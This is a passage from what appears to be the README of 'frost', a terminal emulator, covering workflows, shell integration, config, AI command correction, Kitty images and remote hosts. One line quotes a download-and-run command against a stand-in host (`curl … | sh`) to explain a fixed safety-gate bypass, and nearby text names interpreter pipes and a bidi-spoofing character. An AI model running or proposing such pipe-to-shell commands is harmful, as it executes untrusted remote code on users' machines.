限制为 4 KiB，正则编译器另有 2 MiB 上限；大小写折叠扩展（如 `İ` → `i` + combining dot）
会映回原文 Unicode scalar span，不会把缓存坐标误用于跳转。

完成来源与退出结果独立记录：匹配的 OSC 133 `C`/`D` 是 healthy；若 `D` 丢失，下一
提示符只会将块标为 `inferred`，不会虚构退出码、耗时或完成时间。畸形或 id 不匹配的
`D`，以及保留窗口内近期错序/重复的 id，不会关闭当前命令。推断事件可以解除本地严格
关联的 Agent 等待，但不会进入桌面完成通知、执行日志或持久化命令历史；未知退出码也绝不会
按 0 写成成功。卡片 badge 与
右键面板会提示退化生命周期，Markdown/JSON 导出则明确携带 completion provenance 与
lifecycle health；Background 输出不计入命令生命周期健康汇总。

命令文本捕获有 16 KiB 上限；超过上限时保留 UTF-8 安全前缀并明确标为截断，复制与
导出仍可使用，但 Recall/Reinput、Agent 和持久化历史不会把不完整命令当成可执行文本。
若 OSC 133 已进入命令生命周期却无法恢复命令内容，会显示不可用占位而不会误归类为
Background。

命令面板中的 **Export Session Blocks as Markdown/JSON** 会把当前 pane 仍保留的
已定型块（最多 256 条，也包括缺失结束标记后由下一提示符收束的记录）写入
`$XDG_DATA_HOME/frost/exports/`（通常是 `~/.local/share/frost/exports/`）。JSON 和
Markdown 都会明确标记命令截断、输出已淘汰及完成来源；JSON 继续保留兼容的
`completion_observed`，并新增 `start_mark_seen`、`completion_provenance` 与
`lifecycle_health`；文件按本地时间命名，
同秒多次导出不覆盖，先私密暂存并原子发布，目录与文件权限分别为 `0700` / `0600`。
JSON 使用版本化的 `frost.block-session` v1 envelope，记录 pane session、捕获时间、
块顺序和截断/淘汰汇总，后续字段演进不再依赖无版本裸数组。

快捷键从 `$XDG_CONFIG_HOME/frost/keybindings.toml`（通常是 `~/.config/frost/keybindings.toml`）加载，并与默认绑定合并。chord 语法与 jterm 家族共享（来自 `jterm_core`）：修饰键顺序任意，接受 `control`、`option`、`cmd`/`command`/`win`/`meta` 等修饰键别名，以及 `enter`/`return`、`esc`/`escape`、`arrowleft`/`left`、`page_up`/`pageup` 等按键别名；`ctrl++` 表示加号本身（也可写 `ctrl+plus`），`\` 可写作 `backslash`，非 ASCII 按键按 Unicode 大小写折叠匹配。

## Workflow 模板

workflow 是一个 TOML 或 YAML 文件：名字、可选描述与标签、一段带占位符的命令模板，
以及若干具名参数。四个 jterm 终端（anvil、ember、forge、frost）读的是同一批目录里的
同一批文件，因此从 2026-08-29 起，加载、校验与渲染由共享的 `jterm_core::workflows`
统一实现——同一个文件在哪个终端里打开都是同一个意思。

搜索路径按优先级：`~/.config/frost/workflows/` → `$FROST_WORKFLOW_DIR`（可用 `:`
分隔多个目录，只是**追加**而不替换标准位置）→ `~/.local/share/frost/workflows/` →
`XDG_DATA_DIRS` 中每个目录下的 `frost/workflows/` → 开发 checkout 的
`scripts/workflows/`。安装脚本把内置示例放进前面的 XDG data 层；源码树只是开发期兜底，
不再是已安装二进制获得示例的条件。同名 workflow 由靠前的目录胜出，因此你自己的文件可以覆盖内置示例。

### workflow 参数的必填约定

**这是本轮唯一会改变既有文件行为的规则**：一个参数是否可以留空，由文件说了算。

- 参数声明了 `default`（包括 `default = ""`），它就有值。表单预填该默认值；你把这一行
  清空，那是一次**明确的空值**，仍然照空值渲染，不会回退到默认值。
- 参数**没有**声明 `default`，它就是必填的。表单里这一行的标签带 `(required)`，
  在你按 Insert 之前就能看见；留空或只填空白时 Insert 拒绝渲染，并在表单上显示
  `Workflow could not be rendered: missing values: <参数名>`。
- 每行的 **Reset** 会恢复文件声明的默认值；没有 `default` 的参数则回到真正的
  “未填写”状态。它不同于手动清空一个声明过默认值的输入框，后者仍表示有意提交空值。

此前四个终端的参数表单都会先用空串把每个声明过的参数填满，于是这条校验虽然写了、
也有单测，实际上永远触发不了：`kill -9 {pid}` 在 Pid 一栏没动过的情况下会渲染成
`kill -9 ` 并回填到提示符。现在不会了。

如果你原本依赖某个参数可以留空，请在文件里把这件事说出来：

```yaml
args:
  - name: extra_flags
    description: "额外参数，可留空"
    default: ""          # 明确声明空值合法
```

内置示例 `scripts/workflows/docker-tail-logs.yaml` 就因此改过一次：它的 `container`
参数原先写着 `default: ""`，在新约定下那等于"空值合法"，`docker logs -f --tail 100 `
仍会被插入提示符。该空默认值已删除，`container` 现在是必填参数。

### 模板占位符

`{name}` 与 `{{name}}` 两种写法都支持，名字两侧的空格会被忽略（`{{ service }}` 与
`{{service}}` 等价）。没有绑定的 `{{...}}` 是字面花括号转义，输出一对 `{`/`}`；
没有绑定的单花括号占位符原样保留，好让你看见自己的拼写错误。

两处收紧值得注意：

- `{{` 与 `}}` 现在按嵌套配对，一个未闭合的 `{{` 不会再去认领后面某个占位符的 `}}`。
  `awk '{{print $1}' {{log}} | sort -u` 过去会渲染成 `awk '{print $1}' access.log | sort -u`
  ——一段不同的、可执行的 awk 程序；现在未闭合的部分原样保留。
- 参数名两侧不允许有空格。`name = "pid "` 这种（引号里多一个看不见的按键）以前会
  正常加载、正常校验，却谁也匹配不上：`kill -9 {{ pid }}` 渲染出字面量
  `kill -9 { pid }`，缺值校验因为"该参数有值"而通过，你在那一行里输入的东西在通往
  提示符的路上被丢掉。现在这样的文件在加载时就被拒绝，并写一条日志说明原因。

渲染结果只回填到提示符供人工审阅，**从不自动执行**；命令与你填入的值都要通过共享的
review-only 边界校验（拒绝控制字符与视觉欺骗字符）。文件大小与数量有上限，符号链接
与 FIFO 等特殊文件在 `open` 时即被拒绝。某个文件解析失败只会被跳过并记一条日志，
不会连累其余 workflow；日志里的路径与解析器原文都经过有界的安全内联处理。

## Shell 集成（OSC 133）

Block mode、提示符跳转、命令历史、长命令通知和失败块的 Agent 动作全部依赖 shell 通过
**OSC 133** 汇报命令边界。frost 默认使用配套 shell [`jsh`](https://github.com/beamiter/jsh)，
它原生发送这些标记，因此开箱即用；找不到 jsh 时会退回 bash。

如果当前 pane 的 shell 不发送 OSC 133，这些功能不会报错，而是**没有任何块可操作**：
卡片、gutter、徽标、滚动条标记与块搜索都为空。此时相关操作会明确说明原因，并指向
命令面板中的 **Install or update jsh**（`Ctrl+Shift+P`）。注意区分两种情况：shell 正常
汇报但你确实还没有失败块时，提示只会说"本 pane 没有该类块"，不会误指集成缺失。

想在自己的 bash/zsh 中启用，只需在提示符前后发送对应标记（`A` 提示符开始、`B` 提示符结束、
`C` 命令开始、`D;<exit>` 命令结束）。frost 只依赖这四个标记，`cwd=` 等参数可选。

## 配置

主配置位于 `$XDG_CONFIG_HOME/frost/config.toml`；未设置或设置为相对路径时，与运行时
`dirs::config_dir` 一样回退到 `~/.config/frost/config.toml`。设置面板中的修改会自动保存，
外部编辑也会热重载。示例：

```toml
font_family = "JetBrains Mono Nerd Font"
font_size = 14.0
line_spacing = 1.0
padding = 2.0
ui_scale = 1.0
opacity = 1.0        # 窗口背景透明度 0.05–1.0，Ctrl+Alt+=/- 实时调节
scrollback_lines = 20000
scroll_speed = 3
theme = "tokyo-night"
tab_position = "top"
restore_session = true
disable_alt_screen = false
block_mode = true     # OSC 133 命令块、gutter、搜索与右键动作
block_compact = false # Compact Block Spacing；仅收紧卡片内缩/圆角，不改变终端行列

# 可选：明确指定 shell
shell = "/bin/bash"

# 何时检查 jsh 是否有新版本：startup 每次启动联网 | daily（默认）复用缓存 | never 关闭
jsh_update_check = "daily"

# 安全默认值。开启后，SSH 中的程序也能读取宿主剪贴板。
allow_clipboard_read = false

# 长命令完成桌面通知（OSC 133 计时；正被注视的 pane 不提醒）
notify_long_blocks = true
notify_long_block_threshold_ms = 10000

# 分屏 pane 标题栏中的 git 分支/脏状态
show_repo_strip = true

# 持久化命令历史（与 anvil/forge 同名键、同 JSONL 格式，可指向同一文件共享）
# 默认写入 ~/.local/state/frost/history.jsonl，只记录命令、目录、退出码与时间
command_history_enabled = true
# command_history_path = "~/.local/state/frost/history.jsonl"
command_history_max_entries = 10000

# AI / Agent（默认关闭；不开启则没有任何数据离开本机）
ai_enabled = false
ai_provider = "anthropic"   # anthropic | openai-compatible | ollama
ai_model = "claude-sonnet-4-6"
# 流式回复：Agent 面板边生成边显示模型回复（三家 provider 均支持）。
# 关闭则退回整段阻塞请求；两种方式记录到会话里的内容完全一致。
ai_stream = true
# API key 文件：一行 key、权限 600。未设置时在设置面板粘贴 key 即可，
# 会自动写入 ~/.config/frost/ai.key。环境变量 FROST_AI_API_KEY_FILE
# 优先于此项（与 forge 一致），且不会被写回配置文件。
# ai_api_key_file = "~/.config/frost/ai.key"

# 向非本地 AI provider 发送命令上下文（命令、cwd、捕获输出）的显式授权。
# 直连本机回环 Ollama 不需要此项；继承的 HTTP 代理会取消该豁免。
# 2026-08-29 起，失败命令纠正也受此开关约束（此前它根本不看这里）：
# 关闭时（默认）不再向 provider 发送失败命令、工作目录和至多 8 KiB 终端输出，
# AI 兜底整体静默；本机三类已验证纠正（目标自身建议、APT 索引、可执行 PATH）
# 从不离开本机，行为不变。依赖 AI 纠正的用户需要显式打开此项。
ai_share_command_context = false
# 失败命令的评审式纠正卡片（需先开启 ai_enabled）：本机 PATH/APT 证据优先；
# 严格 JSON 的 AI 兜底另需 ai_share_command_context = true（未授权或未配置
# provider 时跳过）。卡片上可编辑，确认后才运行或插入提示符（未验证或编辑过的
# 候选仅插入，仍需自己按回车）。详见下方“失败命令的评审式纠正”。
command_correction_enabled = false
# 实验性 Tasks 面板（侧栏 "Tasks" 页）：为失败命令块创建独立 Git worktree
# 任务，并可选地运行原生 Codex 会话。与云端 AI 授权相互独立。
experimental_task_sidebar = false
```

### 失败命令的评审式纠正

引擎自 2026-08-29 起由 `jterm_core::command_correction` 提供，与 anvil/forge/ember 共用同一份
分类器、安全门、提示词与解析器；frost 侧只保留三样东西：构造引擎时声明的策略、按 pane 的请求
登记表，以及卡片本身。合并四份各自漂移的私有副本时修掉了三处真实漏洞，因此**行为有可见变化**：

- **AI 兜底现在受 `ai_share_command_context` 约束，而该项默认关闭。** 此前这个界面在
  `ai_enabled` + `command_correction_enabled` 下就会直接把失败命令、工作目录和至多 8 KiB
  终端输出发给 provider，不看这个授权开关（frost 在 `ai_chats`、`ai_command` 和 Tasks 面板里
  一直是看的）。现在关闭时卡片只会来自本机验证过的证据：目标程序自己给出的拼写建议、本机 APT
  索引、本机可执行 PATH。这三条从不联网，行为不变。**想继续获得 AI 纠正，请显式设置
  `ai_share_command_context = true`。**
- **候选命令不能新增通向 shell / 解释器的管道。** 旧的安全门只检查某个 shell 控制符号是否
  “出现过”，所以当原命令本身就含有 `|` 时，追加 `| sh` 不引入任何新符号，能直接通过——
  `curl -sS https://example.invalid/setup | head -20` 失败后，`curl -sS https://evil.invalid/x | sh`
  可以出现在卡片里。新规则按引号安全地切分管道并比较各段实际运行的解释器集合，
  `|  sh`（两个空格）、`| /bin/sh`、`| zsh`、`| python3`、`| xargs sh -c`、`| $SHELL` 同样拒绝；
  而 `ls | gerp foo` → `ls | grep foo` 仍照常提供。
- **卡片理由行经过脱敏与单行折叠。** provider 返回的 `message` 过去被原样插进可编辑、已预填、
  已聚焦的命令输入框正上方的文本里，含 U+202E 的回复可以反转旁边文字的显示顺序；
  现在双向覆盖字符渲染为 U+FFFD。行内错误提示同样被限制为单行 200 字符。
- **卡片新增 `⚠ destructive:` 风险标签**，与 Agent 审批卡片一致，随草稿每次按键重算。
  危险判定从来只决定“能否直接运行”（未验证候选本就不能直接运行），所以
  `rm -rf ~/work` 这类建议此前与 `git status` 的外观完全相同。
- **超过 16 KiB 的失败命令不再被分类**，也就不再排序、探测或送去询问模型——这个界面自身声明的
  预算就是 16 KiB。
- **已验证候选只差首尾空白时会照常直接运行**，提交的是去掉空白后的命令：按钮文案与实际提交
  现在取自同一个已校验字符串，不会再一个说“插入待审”另一个却直接运行。
- **PATH 目录扫描忽略相对与空的 PATH 项**，打开一个恰好位于相对 PATH 项上的项目，不会再把它的
  文件名贡献成纠正候选。

不变的一项，值得说明成本：自动探测只从固定绝对路径（`/usr/bin/bash`、`/bin/bash`、
`/usr/local/bin/bash`、`/usr/bin/apt-cache`、`/bin/apt-cache`）解析 helper，并要求路径每一段
都属系统所有且不可被组/其他人写入。frost 本来就是四端里唯一做对这件事的，因此这里没有回归；
代价照旧——把 `apt-cache` 放在别处的非 FHS 主机拿不到 APT 证据，卡片会退化为未验证候选或干脆
不出现。对一个“任何命令失败都会自动拉起子进程”的界面来说，这是正确的取舍。

### 实验性 Tasks 面板（原生 Codex 运行时）

开启 `experimental_task_sidebar` 后，失败命令块的右键菜单会出现 **Create task**：
frost 为该命令创建独立的 Git worktree（位于 `~/.local/share/frost/agent-tasks/`）并登记一个任务卡片。
任务卡片上的 **Start Codex** 在 `ai_enabled` 与 `ai_share_command_context` 都已开启时可用，
进入可取消的后台准备阶段（校验已注册 worktree、固定目录描述符、解析可信 codex/node 启动链、
构造受限 prompt、创建私有 0700 CODEX_HOME），全程不阻塞 UI；准备完成时任务代际与当前的
共享/脱敏授权会再次校验，取消、过期或授权被撤销的结果会被直接销毁而不会启动 Codex。

原生会话通过 codex app-server 的换行分隔 JSONL 协议运行，目前只接受已审计的
**codex-cli 0.147.0** 协议版本；登录仅通过 login RPC 传递当前内存中的访问令牌，
并在启动线程前校验 effective config，拒绝任何继承的 MCP、hooks、插件、应用、项目信任或
托管配置来源。审批策略固定为 `never`：托管审批请求只完整展示并只能 **Deny**。
每个 turn 结束后会话停在 **Ready for review**：可以发送有界评审反馈在同一线程上开始顺序后续
turn（最多 32 个），或选择 **Finish Codex** 结束会话。一个回合完成后会话不可恢复、不可重启。

隔离与回收：provider 运行在描述符固定的独立 worktree 和瞬态 user-systemd cgroup
（需要 **cgroup v2** 与可用的 systemd 用户会话）中；`/tmp` 不在可写根内，工具子进程获得
无登录、无代理、仅含受审绝对 PATH 的独立环境；frost 异常退出时由外部 guardian 触发
`cgroup.kill`。只有在 cgroup 为空且 leader 被回收后，任务才进入可验证状态。

会话完全停止后，**Run validation** 会在 worktree 内的独立只读验证终端中重放创建该任务的
原始命令（要求精确、未截断、单行；拒绝控制字符与双向伪装字符、符号链接逃逸，并重新校验
Git 注册与分支；通过打开的目录描述符 + fchdir 传递 cwd，shell 以非登录、no-rc 方式启动）。
验证结果为 running/passed/failed/needs-review/cancelled；即使验证通过，也必须显式点击
**Mark complete** 才算接受任务。**Review diff** 显示相对任务基准提交的有界
`git status --short` 与已跟踪文件的 `git diff HEAD`（未跟踪文件只列出路径）。
原生会话失败或退出不成功时，可以用 **Open terminal Agent** 在终端中显式继续（PTY 兼容路径）。
任务元数据仅存在于运行时；**Hide task** 只隐藏元数据，不会删除 worktree。
任务终端（Agent 或验证）的子进程退出后标签页会保留为只读副本供回看：标题带 "(exited)" 后缀、
pane 头部显示 `■ exited`，键盘与粘贴输入不再写入已死的 PTY，只会弹出一条节流提示；任务终端
也不会进入会话快照，重启后不会恢复成恰好落在任务 worktree 里的普通 shell。


`Ctrl+=`、`Ctrl+-` 和 `Ctrl+滚轮` 只调整当前运行时字号，不再改写配置；`Ctrl+0` 回到 `font_size`。`ui_scale` 会统一缩放标签栏、状态栏、设置面板和命中区域。设置面板中的持久修改仍会自动保存。

设置中的 **Compact Block Spacing** 与 `block_compact` 是同一开关，并会立即更新所有当前 pane。它只收紧卡片内缩与圆角，不改变连续终端 grid 的行列、OSC 133 区域坐标或 PTY 大小。

如果 `config.toml` 或 `keybindings.toml` 编辑出错，frost 会保留最后一次可用配置并在窗口内显示诊断。主配置有错误时自动保存会暂停，避免默认值覆盖原文件；修正文件后会自动恢复热重载。

内置主题包括 Dark、Light、Monokai、Dracula、Nord、Gruvbox Dark、Tokyo Night、One Dark、Catppuccin Mocha 和 Solarized Light。自定义主题保存在 `~/.config/frost/themes/`。

## 安装与更新 jsh

frost 优先使用配套 shell [`jsh`](https://github.com/beamiter/jsh)，找不到才退回 bash。
命令面板中的 **Install or update jsh** 会在独立会话里运行安装脚本：会话本身就是进度界面，
可以 Ctrl+C 中断，脚本结束后等待 Enter 再关闭，失败原因不会一闪而过。

安装脚本来自 jsh 仓库并内嵌在二进制里，因此一台从未装过 jsh 的机器也能引导；校验和验证、
`rename(2)` 原子替换（**运行中的 shell 不受影响，新会话才使用新版本**）、旧二进制回滚副本，
以及 `PATH` 上的 `jsh` 其实是同名的其他程序时的提示，都由脚本统一处理。

缺少 jsh 或有新版本时，标签栏下方出现一条可忽略的提示行。检查在后台线程进行、从不自动安装，
离线时保持静默。`jsh_update_check = "daily"`（默认）复用安装脚本自己的缓存
（`~/.cache/jsh/update-check.json`），同机同时开着多个 jterm 也只产生一次网络请求；
`"startup"` 每次启动都联网，`"never"` 关闭检查。

## Kitty 图像协议

协议的结构层——控制数据解析、`m=1` 分块重组、base64 解码、原始格式长度校验、PNG 的 IHDR 嗅探
和全部容量上限——现在来自 anvil/2/3/4 共用的 `jterm_core::kitty_graphics`（预算取 `Caps::SCREEN`：
64 MiB 编码 / 64 MiB 解码 / 16384 像素边长 / 16 KiB 控制段 / 64 MiB 全部在途分块）。图像仓库、
放置、删除和协议应答仍留在 frost，因为它们需要解码器给出的尺寸和错误文本。

**升级后可见的行为变化：**

- **`x=` / `y=` 改回协议语义，图像位置会移动。** 以前 frost 把 `x=`/`y=` 当成屏幕列/行，
  于是不带这两个键的图像一律画在左上角 `(0,0)`。它们在协议里是**源图裁剪偏移**（像素），
  屏幕位置由命令抵达时的**光标格**决定。现在 `a=T` / `a=p` 都锚定在光标处，`x=`/`y=`/`w=`/`h=`
  只裁剪源图。**先前渲染在左上角的图像会改到光标位置显示**，用 `x=`/`y=` 手工摆位的脚本需要改用光标定位。
- **`t=` 会被校验。** 以前 `t=` 被完全忽略，`t=f` 会把 base64 编码的**文件路径**喂给图像解码器，
  然后静默失败。现在只接受 `t=d`（内联），`t=f` / `t=t` / `t=s` 一律回 `ENOTSUP`。
- **新增协议应答。** 以前没有任何应答，用 `i=` 寻址的客户端（如 `kitten icat`）只能等到自己超时。
  现在带 `i=` 或 `I=` 的命令会收到 `ESC _ G i=<id>[,p=<id>] ; OK ESC \` 或 `<code>:<message>`；
  `q=1` 吃掉 `OK`，`q=2` 连错误一起吃掉；`p=0` 不回显。分块传输只在最后一块之后应答一次。
- **只有 APC 会进入图像协议。** 以前 DCS（`ESC P`）、SOS（`ESC X`）、PM（`ESC ^`）与 APC 走同一条路，
  且用 `payload.contains("a=")` 嗅探，一段无关的 DCS 只要含 `a=` 就会被当作图像命令。
  现在只有 `ESC _ G …` 才路由过去。
- **`f=` 缺省值从 PNG 变成 RGBA。** 这是协议默认值。不写 `f=` 的命令现在表示原始 RGBA，
  必须同时给出 `s=` 和 `v=`。
- **`f=` 只接受 `100` / `32` / `24`。** frost 私有的 `png` / `jpeg` / `jpg` / `webp` / `rgb` / `rgba`
  别名已移除，随之**不再支持 JPEG 与 WebP 传输**（`f=100` 只解码 PNG）。
- **分号分隔的旧语法已移除。** `a=t;i=1;s=100;v=100;f=png` 这种 frost 私有写法不再被识别，
  只接受标准的 `G<控制对逗号分隔>;<base64>`。
- **原始像素长度必须精确匹配** `s*v*通道数`，以前允许多余尾字节。
- **`i=` 与 `I=` 互斥**，同时给出会被拒绝。
- **base64 更严格**：长度 `% 4 == 1` 或中间出现 `=` 会被拒绝（仍容忍空白与缺失/多余的尾部填充）。
- **续块只能带 `m=` 和可选的 `q=`**；带其它控制的「续块」会被当成新命令并中断原传输。
- **尺寸上限从 8192 提高到 16384**（像素总量仍受 64 MiB 解码预算约束）。
- **10 秒未完成传输超时已移除。** 这里不再有时钟：半截上传由终端复位（RIS，`ESC c`）和
  共享的在途字节总量上限兜底。
- `a=p` 引用不存在的图像会返回 `ENOENT`，而不是记下一个永远画不出来的放置。

## 安全说明

终端控制序列来自本地或远程程序，不能天然视为可信输入。frost 默认拒绝 OSC 52/5522 读取宿主剪贴板；如果显式开启 `allow_clipboard_read`，通过 SSH 运行的程序也可能获得剪贴板内容。剪贴板写入仍按主流终端兼容行为允许。Kitty 图像、OSC 8 链接和通知均有资源、协议或频率限制。

失败命令的纠正卡片是唯一会“因为命令失败而自动拉起子进程”的界面，因此它的探测只从固定绝对候选
路径解析 helper，并要求路径每一段都属系统所有且不可被组/其他人写入；用户 `PATH` 上的同名程序
既不会被信任，也根本不会被考虑。候选命令必须通过同一道安全门：不得新增 shell 控制语法、
不得新增 `sudo`/`doas`/`su`、不得新增 SSH/SCP 类远程执行，也不得新增通向 shell 或解释器的管道。
向 provider 发送失败命令、工作目录与终端输出需要 `ai_share_command_context`（默认关闭）；
未授权时只提供本机验证过的纠正。任何候选都不会自动执行：未验证或被编辑过的候选只回填提示符。

## 开发验证

```bash
cargo fmt --all -- --check
scripts/security-check.sh
cargo clippy --all-targets --all-features --locked -- -D warnings
RUSTDOCFLAGS="-D warnings" cargo doc --no-deps --all-features --locked
cargo test --all-targets --all-features --locked --no-fail-fast
cargo build --release --all-features --locked
bash scripts/test-install-paths.sh
desktop-file-validate data/io.github.beamiter.frost.desktop
appstreamcli validate --pedantic --no-net data/io.github.beamiter.frost.metainfo.xml
```

`security-check.sh` 要求 `cargo-deny`、`cargo-audit` 与 ShellCheck；也可用
`--policy`、`--audit` 或 `--shell` 单独运行对应子门。CI 对依赖来源/许可证、
RustSec、格式、零警告 Clippy/rustdoc、全量测试和 release 构建分别设有独立质量门槛；安装测试还会用
预编译 fixture 做一次真实 `DESTDIR` 安装/卸载往返，核对权限、桌面启动路径和全部资源文件。
项目级 cargo-audit 策略把新的 warning 也视为失败；`vendor/cryoglyph` 是
crates.io 0.1.0 的源码，仅把受 RUSTSEC-2026-0253 影响的 `lru 0.16`
约束提升到已修复的 0.18.2，待上游发布等价修复后即可删除。

调试构建可设置 `FROST_DEBUG=1` 输出有界的协议字节预览。

## 许可证

frost 以 **MIT OR Apache-2.0** 双许可证发布，使用者可任选其一；完整文本见
[`LICENSE-MIT`](LICENSE-MIT) 与 [`LICENSE-APACHE`](LICENSE-APACHE)。向本仓库提交
贡献即表示贡献者同意按相同的双许可证条款授权该贡献。

## Remote hosts and containers

Ctrl+Shift+S opens the remote host picker. An entry in the config file names an
ssh destination or a running container, and choosing one opens it in a new
session:

```toml
# An ssh destination…
[[remote_hosts]]
name = "dev"
host = "dev.example.com"
user = "yj"
deploy = "persist"
ssh_args = ["-p", "22"]

# …and a running container, reached with docker exec.
[[remote_hosts]]
name = "myubuntu"
host = "myubuntu"
docker = true
deploy = "persist"
```

These two are also what a config file with no `remote_hosts` key starts with:
the two mistakes the grammar cannot forgive are invisible in an empty list —
the port belongs in `ssh_args`, never as `host = "box:22"`, and the login
belongs in `user`, never as `host = "root@box"`. An explicit list wins,
`remote_hosts = []` included, so hosts deleted in the panel stay deleted.

The settings panel (Ctrl+Shift+O) has a Remote hosts section that adds,
edits and removes these entries in place; changes auto-save into the same
`[[remote_hosts]]` tables.

Auto-save preserves invalid and temporarily incomplete drafts instead of
deleting them while a field is being edited. A single application gate combines
the shared grammar with byte budgets and visual-spoofing checks, and the picker,
session launcher, and remote Files backend all re-run it before starting a
process. Length, control-character, and visual-format checks run before shared
semantic validation, so rejected `deploy` drafts never echo raw oversized or
direction-changing text into UI diagnostics. The first 128 entries may be active; later entries still round-trip and
remain editable but are shown as unavailable, while Add is disabled until the
count drops below 128.
The picker and Settings render a bounded 256-row prefix without truncating the
stored list; entry 129 is therefore still visible and diagnosed, and any
further drafts are explicitly reported as retained off-view. Arrow navigation
skips invalid/inactive entries, active selectors expose only the first 128,
and save feedback counts invalid active drafts separately from over-limit
retained drafts.

`deploy = "off"` (the default) connects plainly and runs `remote_shell`
(default `jsh`) as found on the destination. `"persist"` and `"incognito"`
bring jsh along through the family's `jsh-remote.sh`: when the local jsh is a
static build — which a Linux install now is — it lends itself, so nothing is
fetched from anywhere and the far side runs exactly the version that sent it.
Persist keeps jsh's dot-files and a cached binary in the destination's `$HOME`
so the next connection skips the transfer; incognito sandboxes `$HOME` and
deletes it on exit — inside a container the sandbox lives in its tmpfs, so
`docker diff` stays empty. An entry the config grammar rejects is shown in the
picker with its reason rather than hidden.

The grammar, validation and argv are shared with the whole jterm family
(`jterm_core::jsh_remote::RemoteHostConfig`); typing `ssh host` or
`docker exec -it name bash` into a jsh prompt reaches the same machinery with
no configuration at all.

The file sidebar (Ctrl+\, Files panel) browses these hosts natively — no
sshfs, nothing to install on the far side. A location picker above the tree
switches between Local and every configured entry (`ssh: …` / `docker: …`);
a plain interactive `ssh user@host -p 22` launched in a local pane is also
observed from the real foreground process argv and, after a successful staged
home probe, opens Files on one unique matching saved profile or a session-only
`temporary` target. For jsh's SSH launcher, Files reuses its verified
ControlMaster socket; a direct command's explicit ControlPath is likewise kept
as live execution metadata rather than saved profile identity. Joining a new
socket for the already visible host upgrades that route in place, retaining
the current root, loaded rows and expansion state. The old tree
stays intact while that probe runs or if it fails, and leaving SSH does not
discard the useful remote tree. Terminal/OSC text is never connection
authority; remote-command forms and options that could replay a local helper
are refused. Password-only authentication gets an actionable key/agent/control
socket notice because file probes are deliberately non-interactive. The
temporary tree's Terminal action starts a plain interactive SSH login instead
of injecting Frost's configured remote helper. A startup race gets one bounded
automatic retry; a still-live command then exposes Retry in the Files notice.
A remote tree is read one directory level at a time by running a small POSIX
sh probe script through `ssh` / `docker exec` stdin, with bounded output and
hard timeouts. Right-clicking a node (or the empty area below the tree, which
targets the root directory) opens a file-operations menu — New File, New
Folder, Rename, Delete (with a full-path confirmation), Copy, Cut, Copy Path,
Paste and Refresh — that works identically locally and remotely. Rows
multi-select with Ctrl+click (toggle) and Shift+click (range in visible
order); a right-click inside the selection applies Delete/Copy/Cut/Copy Paths
to the whole selection as one batch job (per-item failures never stop the
rest and are summarized; the delete confirmation lists the count and the
first few paths). The ⌕ header button opens an inline name filter over the
loaded tree — case-insensitive substring, matches keep their ancestors
(force-expanded while filtering), expansion is exactly restored on clear, and
no new directory scans happen. The adjacent **Hidden** toggle includes or
excludes dot-prefixed entries on both Local and remote backends; policy changes
reload under a new tree generation, so a slow response from the prior mode is
discarded. Same-root refreshes are stale-while-refresh: existing rows, loaded
descendants, and expansion state remain visible; a successful scan reconciles
entries by path and type, while a failed scan keeps the last-good snapshot and
shows the error inline. Reconciliation also retires selection, hover, drop, and
delayed-action targets whose rows disappeared. Root navigation is
transactional: Back/Forward, Parent/Home, breadcrumbs, the safe absolute-path
bar, and Open Folder scan a candidate before committing, so failure or an
out-of-order result leaves the current tree, selection, and expansion intact.
Successful history is capped at 32 entries and departed roots use an
authority/path/Hidden-bound eight-root cache whose affected parent snapshots
are precisely invalidated after file operations. The two-slot coordinator
allows one running scan and at most 16 queued scans per remote authority,
reports queue/run latency, applies classified 2–60 second cooldowns (an explicit
Retry bypasses once), retires expired unreferenced cooldown buckets, and while
Files is visible revalidates at most two oldest visible stale directories per
tick. Remote list v4 receives an
explicit `4096 + 1` limit and hidden policy, stops emitting at that bound, and
uses the extra entry to label a partial snapshot. Invalid UTF-8, non-component,
and duplicate paths never become actionable rows; directory symlinks render as
non-expandable files. Paste also
crosses locations: a remote entry pasted locally downloads, a local entry
pasted to a remote host uploads, and distinct remote filesystems relay through
a unique local temp path; saved and temporary live routes to one namespace
copy/move directly through the live socket. Files stream (never buffered whole, 512 MiB cap, group-kill
on timeout) and directories travel as tar; the probe refuses an existing
directory target before extracting, and a cut across locations deletes
the source only after the copy completes. Transfers report live progress in
the panel (uploads show bytes against the file's size) and can be cancelled
from the same notice — a cancelled transfer never leaves a partial file in
place. Dropping files or folders from the OS file manager onto the tree
imports them — onto a directory row into that directory, anywhere else into
the current root; remote locations go through the same upload channel with
progress and cancel. A drop is capped at 256 items and the transfer size
limit, and existing names are refused per item, never overwritten. Remote
operation failures surface inline in the panel rather than taking the tree
down. The Files header also offers **Terminal here**, which opens a new local
session at the visible tree root. On a remote tree it becomes **Remote terminal
(default dir)** and uses that same current profile's normal connection path,
which starts in the profile's default directory rather than pretending the
sidebar path can be transferred to a shell.

Remote-host config edits and hot reloads never reinterpret a saved numeric
index. The current tree and file clipboard are rebound only when the complete
old profile has exactly one active match in the new list. A removed, edited, or
duplicate/ambiguous identity fails closed to Local and invalidates old
selection, dialogs, delete confirmations, clipboard, drop plans, and transfer
feedback. Delayed file actions carry the tree generation and are rejected
after any root/location change. If the initial remote-home probe fails, the
panel returns to a usable Local tree, shows the bounded error inline, and lets
the profile be selected again for a retry.
